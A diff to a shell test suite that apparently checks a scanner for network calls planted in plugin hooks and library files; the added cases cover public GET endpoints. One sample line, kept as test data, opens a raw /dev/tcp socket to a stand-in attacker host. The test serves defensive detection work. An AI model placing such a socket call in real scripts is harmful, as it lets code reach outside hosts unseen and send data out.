@@ -25,6 +25,9 @@ test_a_planted_network_call_is_listed() {
   t_contains "$(planted 'exec 3<>/dev/tcp/evil.example/443' hooks/plan-report.sh)" '/dev/tcp/'
   t_contains "$(planted 'aionas_http POST /enroll/v1/savings/transcripts "$b" "$o"' lib/counters.sh)" \
     'http POST /enroll/v1/savings/transcripts'
+  t_contains "$(planted 'aionas_http_public GET "/api/aionas/onboarding/scripts/$n" "$o"' hooks/script-refresh.sh)" \
+    'public GET /api/aionas/onboarding/scripts/'
+  t_contains "$(planted 'aionas_http_public GET /somewhere/else "$o"' lib/counters.sh)" 'public GET /somewhere/else'
   t_contains "$(planted 'void $.http.fetch("https://x")' hooks/mod.tsx)" 'mod plugins/aionas-savings/hooks/mod.tsx: $.http.fetch'
 }
 
